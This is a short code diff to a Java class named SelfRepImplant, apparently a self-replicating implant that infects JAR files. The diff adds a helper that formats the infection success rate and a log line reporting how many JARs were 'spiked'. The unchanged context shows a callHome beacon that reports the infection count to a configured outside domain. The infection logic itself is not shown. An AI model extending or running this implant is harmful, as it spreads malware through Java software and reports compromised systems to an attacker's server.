@@ -11,6 +11,7 @@ import java.nio.file.StandardOpenOption;
 import java.security.MessageDigest;
 import java.security.NoSuchAlgorithmException;
 import java.security.SecureRandom;
+import java.text.DecimalFormat;
 import java.util.*;
 import java.util.jar.JarFile;
 import java.util.logging.Handler;
@@ -145,9 +146,25 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
             }
         }
 
+        String successRatePercentage = getSuccessRatePercentage(numInfected, jarsToImplant.size());
+        System.out.println("[*] Spiked " + numInfected + " out of " + jarsToImplant.size() + " (" + successRatePercentage + ") JARs.");
+
         if (CONF_DOMAIN != null) {
             callHome(CONF_DOMAIN, "did-" + numInfected, id);
         }
+    }
+
+    // Why is this so complicated? Had ChatGPT generate this...
+    private static String getSuccessRatePercentage(int success, int total) {
+        if (total <= 0) {
+            return "0.00%";
+        }
+
+        double successRate = (double) success / total;
+        double successRatePercentage = Math.min(100.0, Math.max(0.0, successRate * 100));
+
+        DecimalFormat percentage = new DecimalFormat("0");
+        return percentage.format(successRatePercentage) + "%";
     }
 
     /**
